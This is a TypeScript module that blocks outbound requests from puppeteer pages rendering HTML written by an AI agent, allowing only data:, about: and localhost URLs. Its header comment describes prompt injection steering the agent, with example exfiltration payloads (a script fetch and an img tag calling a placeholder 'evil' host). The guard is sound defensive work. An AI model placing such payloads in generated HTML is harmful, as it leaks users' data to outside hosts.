/**
 * Network guard for puppeteer pages rendering agent-authored HTML.
 *
 * The agent that composes a Maket document is semi-trusted: a prompt-injected
 * brief can produce HTML containing `<script>fetch('https://evil/')...</script>`
 * or an `<img src="https://evil/?leak=…">`. When that HTML is rendered to PDF
 * or screenshotted by puppeteer, every outbound request resolves through the
 * Chromium that runs as the local user — so the agent's exfiltration succeeds.
 *
 * `installNetworkGuard(page, mode)` neutralises this:
 *
 *  - `mode: "offline"` — nothing leaves the page. Use for paths where every
 *    asset is already inlined (PDF, thumbnail).
 *  - `mode: "localhost-only"` — only `data:` URIs and requests to `127.0.0.1`
 *    or `localhost` succeed. Use for paths that legitimately fetch from the
 *    Maket HTTP server (layout, preview).
 */

import type { Page } from "puppeteer";

export type NetworkGuardMode = "offline" | "localhost-only";

const LOCAL_HOSTNAMES = new Set(["localhost", "127.0.0.1", "::1"]);

export async function installNetworkGuard(
	page: Page,
	mode: NetworkGuardMode,
): Promise<void> {
	if (mode === "offline") {
		await page.setOfflineMode(true);
		return;
	}

	await page.setRequestInterception(true);
	page.on("request", (req) => {
		const url = req.url();
		// Always allow data: and about: (no network round-trip).
		if (url.startsWith("data:") || url.startsWith("about:")) {
			req.continue().catch(() => {});
			return;
		}
		try {
			const u = new URL(url);
			if (
				(u.protocol === "http:" || u.protocol === "https:") &&
				LOCAL_HOSTNAMES.has(u.hostname.toLowerCase())
			) {
				req.continue().catch(() => {});
				return;
			}
		} catch {
			// Malformed URL — block.
		}
		req.abort("blockedbyclient").catch(() => {});
	});
}
